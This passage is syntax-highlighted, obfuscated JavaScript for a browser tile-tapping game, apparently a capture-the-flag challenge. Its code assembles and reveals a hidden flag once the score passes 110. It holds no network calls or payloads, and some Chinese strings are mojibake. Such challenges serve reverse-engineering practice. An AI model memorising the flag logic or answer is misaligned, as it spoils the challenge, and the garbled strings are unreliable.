class="number">0x0</span>],flag[<span class="number">0x4</span>]),flag[<span class="number">0x3</span>]);&#125;<span class="keyword">function</span> <span class="title function_">createrow</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x2280df=&#123;<span class="string">&#x27;mMirY&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3306f1</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3306f1</span>();&#125;,<span class="string">&#x27;Trirl&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;14&#x27;</span>),<span class="string">&#x27;jTrWv&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;c&#x27;</span>),<span class="string">&#x27;nZzwC&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3cfeea</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3cfeea</span>();&#125;,<span class="string">&#x27;YAIYI&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xf36d5d,_0x1ccb30</span>)&#123;<span class="keyword">return</span> _0xf36d5d||_0x1ccb30;&#125;,<span class="string">&#x27;EkFcm&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;15&#x27;</span>),<span class="string">&#x27;BUnIs&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x330693,_0x4f4547</span>)&#123;<span class="keyword">return</span> _0x330693==_0x4f4547;&#125;,<span class="string">&#x27;blIGg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3daa21,_0x3b06f5</span>)&#123;<span class="keyword">return</span> _0x3daa21!==_0x3b06f5;&#125;,<span class="string">&#x27;pLYcs&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;16&#x27;</span>),<span class="string">&#x27;WmHSk&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;17&#x27;</span>),<span class="string">&#x27;LdBOh&#x27;</span>:<span class="string">&#x27;pNxjJ&#x27;</span>&#125;;<span class="keyword">var</span> _0x3b3385=$(<span class="string">&#x27;con&#x27;</span>);<span class="keyword">var</span> _0x5afcef=<span class="title function_">creatediv</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;18&#x27;</span>)]);<span class="keyword">var</span> _0xf09bdd=<span class="title function_">createcell</span>();_0x3b3385[<span class="string">&#x27;appendChild&#x27;</span>](_0x5afcef);<span class="keyword">for</span>(<span class="keyword">var</span> _0xa4a713=<span class="number">0x0</span>;_0xa4a713&lt;<span class="number">0x4</span>;_0xa4a713++)&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;19&#x27;</span>)===<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;19&#x27;</span>))&#123;_0x5afcef[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1a&#x27;</span>)](<span class="title function_">creatediv</span>(_0xf09bdd[_0xa4a713]));&#125;<span class="keyword">else</span>&#123;_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1b&#x27;</span>)](init);&#125;&#125;<span class="keyword">if</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1c&#x27;</span>)](_0x3b3385[<span class="string">&#x27;firstChild&#x27;</span>],<span class="literal">null</span>))&#123;<span class="keyword">if</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1d&#x27;</span>)](<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;16&#x27;</span>),_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1e&#x27;</span>)]))&#123;ev[<span class="string">&#x27;target&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1f&#x27;</span>)][<span class="string">&#x27;pass1&#x27;</span>]=<span class="number">0x1</span>;&#125;<span class="keyword">else</span>&#123;_0x3b3385[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1a&#x27;</span>)](_0x5afcef);&#125;&#125;<span class="keyword">else</span>&#123;<span class="keyword">if</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;20&#x27;</span>)],_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;21&#x27;</span>)]))&#123;_0x3b3385[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;22&#x27;</span>)](_0x5afcef,_0x3b3385[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;23&#x27;</span>)]);&#125;<span class="keyword">else</span>&#123;<span class="keyword">var</span> _0x492bb8=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;24&#x27;</span>)[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>),_0x356832=<span class="number">0x0</span>;<span class="keyword">while</span>(!![])&#123;<span class="keyword">switch</span>(_0x492bb8[_0x356832++])&#123;<span class="keyword">case</span><span class="string">&#x27;0&#x27;</span>:result=!![];<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;1&#x27;</span>:clock=<span class="variable language_">window</span>[<span class="string">&#x27;setInterval&#x27;</span>](_0x2280df[<span class="string">&#x27;Trirl&#x27;</span>],<span class="number">0x1e</span>);<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;2&#x27;</span>:$(_0x2280df[<span class="string">&#x27;jTrWv&#x27;</span>])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;25&#x27;</span>)]=<span class="keyword">function</span>(<span class="params">_0x41a97a</span>)&#123;_0x41a97a=_0x1b6288[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;26&#x27;</span>)](_0x41a97a,event);<span class="title function_">judge</span>(_0x41a97a);&#125;;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;3&#x27;</span>:<span class="keyword">for</span>(<span class="keyword">var</span> _0x3c3b91=<span class="number">0x0</span>;_0x3c3b91&lt;<span class="number">0x4</span>;_0x3c3b91++)&#123;_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;27&#x27;</span>)](createrow);&#125;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;4&#x27;</span>:<span class="keyword">var</span> _0x1b6288=&#123;<span class="string">&#x27;MOzPj&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x5adec6,_0x8e2f0b</span>)&#123;<span class="keyword">return</span> _0x2280df[<span class="string">&#x27;YAIYI&#x27;</span>](_0x5adec6,_0x8e2f0b);&#125;&#125;;<span class="keyword">continue</span>;&#125;<span class="keyword">break</span>;&#125;&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">delrow</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0xea83af=&#123;<span class="string">&#x27;XGzyl&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xec6fe5,_0x4e0795</span>)&#123;<span class="keyword">return</span> _0xec6fe5==_0x4e0795;&#125;,<span class="string">&#x27;TBqmT&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x442e1a</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x442e1a</span>();&#125;,<span class="string">&#x27;wCkoL&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2d3224,_0x34b7d6</span>)&#123;<span class="keyword">return</span> _0x2d3224==_0x34b7d6;&#125;,<span class="string">&#x27;lniar&#x27;</span>:<span class="string">&#x27;WeIGh&#x27;</span>&#125;;<span class="keyword">var</span> _0x13b8d4=$(<span class="string">&#x27;con&#x27;</span>);<span class="keyword">if</span>(_0xea83af[<span class="string">&#x27;wCkoL&#x27;</span>](_0x13b8d4[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;28&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)],<span class="number">0x6</span>))&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2a&#x27;</span>)===_0xea83af[<span class="string">&#x27;lniar&#x27;</span>])&#123;_0x13b8d4[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2b&#x27;</span>)](_0x13b8d4[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2c&#x27;</span>)]);&#125;<span class="keyword">else</span>&#123;<span class="keyword">if</span>(_0xea83af[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2d&#x27;</span>)](rows[i][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2e&#x27;</span>)],<span class="number">0x1</span>))&#123;_0xea83af[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2f&#x27;</span>)](fail);&#125;&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">createcell</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0xdb917a=&#123;<span class="string">&#x27;prkYr&#x27;</span>:<span class="string">&#x27;cell&#x27;</span>&#125;;<span class="keyword">var</span> _0x350dc0=[<span class="string">&#x27;cell&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),_0xdb917a[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;31&#x27;</span>)],_0xdb917a[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;31&#x27;</span>)]];<span class="keyword">var</span> _0x143001=<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;32&#x27;</span>)](<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;33&#x27;</span>)]()*<span class="number">0x4</span>);_0x350dc0[_0x143001]=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;34&#x27;</span>);<span class="keyword">return</span> _0x350dc0;&#125;<span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x50dc93=&#123;<span class="string">&#x27;pvEAg&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),<span class="string">&#x27;kclIZ&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;34&#x27;</span>),<span class="string">&#x27;kKiZZ&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;35&#x27;</span>),<span class="string">&#x27;TfNvb&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x24d967,_0x2d20a7</span>)&#123;<span class="keyword">return</span> _0x24d967&gt;_0x2d20a7;&#125;,<span class="string">&#x27;ExruN&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x20928b,_0x223fd3</span>)&#123;<span class="keyword">return</span> _0x20928b==_0x223fd3;&#125;,<span class="string">&#x27;CPgjs&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3d1bb4</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3d1bb4</span>();&#125;&#125;;<span class="keyword">var</span> _0x7d254e=$(_0x50dc93[<span class="string">&#x27;kKiZZ&#x27;</span>]);<span class="keyword">var</span> _0xcb4af7=<span class="built_in">parseInt</span>(<span class="variable language_">window</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;36&#x27;</span>)](_0x7d254e,<span class="literal">null</span>)[<span class="string">&#x27;top&#x27;</span>]);<span class="keyword">if</span>(_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;37&#x27;</span>)](speed+_0xcb4af7,<span class="number">0x0</span>))&#123;_0xcb4af7=<span class="number">0x0</span>;&#125;<span class="keyword">else</span>&#123;_0xcb4af7+=speed;&#125;_0x7d254e[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;38&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=_0xcb4af7+<span class="string">&#x27;px&#x27;</span>;<span class="title function_">over</span>();<span class="keyword">if</span>(_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3a&#x27;</span>)](_0xcb4af7,<span class="number">0x0</span>))&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3b&#x27;</span>)!==<span class="string">&#x27;YeXSy&#x27;</span>)&#123;<span class="keyword">var</span> _0x4b2784=[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),_0x50dc93[<span class="string">&#x27;pvEAg&#x27;</span>],<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>)];<span class="keyword">var</span> _0x357234=<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;32&#x27;</span>)](<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;33&#x27;</span>)]()*<span class="number">0x4</span>);_0x4b2784[_0x357234]=_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3c&#x27;</span>)];<span class="keyword">return</span> _0x4b2784;&#125;<span class="keyword">else</span>&#123;_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3d&#x27;</span>)](createrow);_0x7d254e[<span class="string">&#x27;style&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3e&#x27;</span>);_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3d&#x27;</span>)](delrow);&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">speedup</span>(<span class="params"></span>)&#123;speed+=<span class="number">0x2</span>;<span class="keyword">if</span>(speed==<span class="number">0x14</span>)&#123;<span class="title function_">alert</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3f&#x27;</span>));&#125;&#125;<span class="keyword">function</span> <span class="title function_">over</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x9d37d9=&#123;<span class="string">&#x27;eLFjJ&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x5cc88e,_0x3b4f5a</span>)&#123;<span class="keyword">return</span> _0x5cc88e!==_0x3b4f5a;&#125;,<span class="string">&#x27;JhtJI&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2330d8</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x2330d8</span>();&#125;,<span class="string">&#x27;kPnGu&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x506701,_0x733825</span>)&#123;<span class="keyword">return</span> _0x506701&lt;_0x733825;&#125;,<span class="string">&#x27;TSXCa&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x31e405,_0x14dd83</span>)&#123;<span class="keyword">return</span> _0x31e405==_0x14dd83;&#125;&#125;;<span class="keyword">var</span> _0x5d88ab=con[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;28&#x27;</span>)];<span class="keyword">if</span>(_0x5d88ab[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)]==<span class="number">0x5</span>&amp;&amp;_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;40&#x27;</span>)](_0x5d88ab[_0x5d88ab[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)]-<span class="number">0x1</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;41&#x27;</span>)],<span class="number">0x1</span>))&#123;_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;42&#x27;</span>)](fail);&#125;<span class="keyword">for</span>(<span class="keyword">let</span> _0x2f89b3=<span class="number">0x0</span>;_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;43&#x27;</span>)](_0x2f89b3,_0x5d88ab[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)]);_0x2f89b3++)&#123;<span class="keyword">if</span>(_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;44&#x27;</span>)](_0x5d88ab[_0x2f89b3][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2e&#x27;</span>)],<span class="number">0x1</span>))&#123;_0x9d37d9[<span class="string">&#x27;JhtJI&#x27;</span>](fail);&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x14c114=&#123;<span class="string">&#x27;soqNf&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3480b3,_0xd21da1</span>)&#123;<span class="keyword">return</span> _0x3480b3+_0xd21da1;&#125;,<span class="string">&#x27;txdzn&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x246811,_0x259a7c</span>)&#123;<span class="keyword">return</span> _0x246811+_0x259a7c;&#125;,<span class="string">&#x27;XdUQK&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x42192d,_0x315028</span>)&#123;<span class="keyword">return</span> _0x42192d+_0x315028;&#125;,<span class="string">&#x27;EyUGz&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xe56318,_0x14eeae</span>)&#123;<span class="keyword">return</span> _0xe56318+_0x14eeae;&#125;,<span class="string">&#x27;iOJjI&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x11f4cd</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x11f4cd</span>();&#125;,<span class="string">&#x27;vfoqn&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2c1a60,_0x34e3b5</span>)&#123;<span class="keyword">return</span> _0x2c1a60&gt;_0x34e3b5;&#125;,<span class="string">&#x27;MQTqg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x25788a,_0x13078a</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x25788a</span>(_0x13078a);&#125;,<span class="string">&#x27;sbqYu&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4e2d7b,_0x25fda1</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x4e2d7b</span>(_0x25fda1);&#125;,<span class="string">&#x27;eWVDT&#x27;</span>:<span class="string">&#x27;浣犵殑鏈€缁堝緱鍒哱x20&#x27;</span>,<span class="string">&#x27;OcpRn&#x27;</span>:<span class="string">&#x27;\x20\x20\x20浣犵殑flag涓�&#x27;</span>,<span class="string">&#x27;aAXDM&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;45&#x27;</span>),<span class="string">&#x27;ynrUN&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4f2806,_0x5042d9</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x4f2806</span>(_0x5042d9);&#125;,<span class="string">&#x27;XUebr&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x38dd19,_0x2d65d2</span>)&#123;<span class="keyword">return</span> _0x38dd19+_0x2d65d2;&#125;,<span class="string">&#x27;hdcqM&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>),<span class="string">&#x27;rbpXR&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;47&#x27;</span>),<span class="string">&#x27;tPTze&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;48&#x27;</span>)&#125;;<span class="built_in">clearInterval</span>(clock);result=![];_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;49&#x27;</span>)](check_action);<span class="keyword">if</span>(_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4a&#x27;</span>)](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4b&#x27;</span>)](<span class="built_in">parseInt</span>,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4b&#x27;</span>)]($,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>))[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]),<span class="number">0x6e</span>))&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4d&#x27;</span>)!==<span class="string">&#x27;OJnvn&#x27;</span>)&#123;flag=_0x14c114[<span class="string">&#x27;soqNf&#x27;</span>](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4e&#x27;</span>)](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4f&#x27;</span>)](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;50&#x27;</span>)](flag[<span class="number">0x8</span>],flag[<span class="number">0x6</span>]),flag[<span class="number">0x1</span>])+flag[<span class="number">0x7</span>],flag[<span class="number">0x5</span>])+flag[<span class="number">0x2</span>]+flag[<span class="number">0x0</span>]+flag[<span class="number">0x4</span>],flag[<span class="number">0x3</span>]);&#125;<span class="keyword">else</span>&#123;_0x14c114[<span class="string">&#x27;sbqYu&#x27;</span>](confirm,_0x14c114[<span class="string">&#x27;eWVDT&#x27;</span>]+_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;51&#x27;</span>)](<span class="built_in">parseInt</span>,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;51&#x27;</span>)]($,<span class="string">&#x27;score&#x27;</span>)[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)])+_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;52&#x27;</span>)]+flag);&#125;&#125;<span class="keyword">else</span>&#123;<span class="keyword">if</span>(_0x14c114[<span class="string">&#x27;aAXDM&#x27;</span>]!==<span class="string">&#x27;EPoSk&#x27;</span>)&#123;_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;53&#x27;</span>)](confirm,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;54&#x27;</span>)](<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;55&#x27;</span>)+<span class="built_in">parseInt</span>(_0x14c114[<span class="string">&#x27;ynrUN&#x27;</span>]($,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;56&#x27;</span>)])[<span class="string">&#x27;innerHTML&#x27;</span>]),_0x14c114[<span class="string">&#x27;rbpXR&#x27;</span>]));&#125;<span class="keyword">else</span>&#123;<span class="keyword">return</span> <span class="variable language_">document</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;0&#x27;</span>)](id);&#125;&#125;<span class="keyword">var</span> _0x35bf64=$(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;35&#x27;</span>));_0x35bf64[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=<span class="string">&#x27;&#x27;</span>;$(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>))[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=<span class="number">0x0</span>;_0x35bf64[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;38&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;57&#x27;</span>)];&#125;<span class="keyword">function</span> <span class="title function_">judge</span>(<span class="params">_0x545af0</span>)&#123;<span class="keyword">var</span> _0xf81cd5=&#123;<span class="string">&#x27;QNpbW&#x27;</span>:<span class="string">&#x27;score&#x27;</span>,<span class="string">&#x27;WjLha&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2c32d9,_0x4db6b6</span>)&#123;<span class="keyword">return</span> _0x2c32d9+_0x4db6b6;&#125;,<span class="string">&#x27;vfRLA&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;55&#x27;</span>),<span class="string">&#x27;rhAgd&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x1892c7,_0x3c5fad</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x1892c7</span>(_0x3c5fad);&#125;,<span class="string">&#x27;LWTJm&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x563e3a,_0x40d179</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x563e3a</span>(_0x40d179);&#125;,<span class="string">&#x27;hbFUP&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4658e5,_0x694647</span>)&#123;<span class="keyword">return</span> _0x4658e5+_0x694647;&#125;,<span class="string">&#x27;yLyYD&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x51620a,_0x1486d2</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x51620a</span>(_0x1486d2);&#125;,<span class="string">&#x27;xwcvM&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;58&#x27;</span>),<span class="string">&#x27;KRCVK&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4ac062,_0x4ad8e7</span>)&#123;<span class="keyword">return</span> _0x4ac062!=_0x4ad8e7;&#125;,<span class="string">&#x27;PfsEX&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),<span class="string">&#x27;yhNxF&#x27;</span>:<span class="string">&#x27;OLkpt&#x27;</span>,<span class="string">&#x27;nDvCe&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3f570c</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3f570c</span>();&#125;&#125;;<span class="keyword">if</span>(_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="string">&#x27;className&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5a&#x27;</span>)](_0xf81cd5[<span class="string">&#x27;xwcvM&#x27;</span>])==-<span class="number">0x1</span>&amp;&amp;_0xf81cd5[<span class="string">&#x27;KRCVK&#x27;</span>](_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5b&#x27;</span>)][<span class="string">&#x27;indexOf&#x27;</span>](_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5c&#x27;</span>)]),-<span class="number">0x1</span>))&#123;_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1f&#x27;</span>)][<span class="string">&#x27;pass1&#x27;</span>]=<span class="number">0x1</span>;&#125;<span class="keyword">if</span>(_0x545af0[<span class="string">&#x27;target&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5b&#x27;</span>)][<span class="string">&#x27;indexOf&#x27;</span>](<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;58&#x27;</span>))!=-<span class="number">0x1</span>)&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5d&#x27;</span>)!==_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5e&#x27;</span>)])&#123;_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5b&#x27;</span>)]=_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5c&#x27;</span>)];_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1f&#x27;</span>)][<span class="string">&#x27;pass&#x27;</span>]=<span class="number">0x1</span>;_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5f&#x27;</span>)](score);&#125;<span class="keyword">else</span>&#123;<span class="keyword">var</span> _0x22a3f1=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;60&#x27;</span>)[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;61&#x27;</span>)](<span class="string">&#x27;|&#x27;</span>),_0x42aa57=<span class="number">0x0</span>;<span class="keyword">while</span>(!![])&#123;<span class="keyword">switch</span>(_0x22a3f1[_0x42aa57++])&#123;<span class="keyword">case</span><span class="string">&#x27;0&#x27;</span>:$(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>))[<span class="string">&#x27;innerHTML&#x27;</span>]=<span class="number">0x0</span>;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;1&#x27;</span>:<span class="keyword">if</span>(<span class="built_in">parseInt</span>($(_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;62&#x27;</span>)])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)])&gt;<span class="number">0x6e</span>)&#123;<span class="title function_">confirm</span>(_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;63&#x27;</span>)](_0xf81cd5[<span class="string">&#x27;vfRLA&#x27;</span>],<span class="built_in">parseInt</span>(_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;64&#x27;</span>)]($,_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;62&#x27;</span>)])[<span class="string">&#x27;innerHTML&#x27;</span>]))+<span class="string">&#x27;\x20\x20\x20浣犵殑flag涓�&#x27;</span>+flag);&#125;<span class="keyword">else</span>&#123;_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;65&#x27;</span>)](confirm,_0xf81cd5[<span class="string">&#x27;hbFUP&#x27;</span>](<span class="string">&#x27;浣犵殑鏈€缁堝緱鍒哱x20&#x27;</span>,<span class="built_in">parseInt</span>(_0xf81cd5[<span class="string">&#x27;LWTJm&#x27;</span>]($,_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;62&#x27;</span>)])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]))+<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;47&#x27;</span>));&#125;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;2&#x27;</span>:<span class="built_in">clearInterval</span>(clock);<span 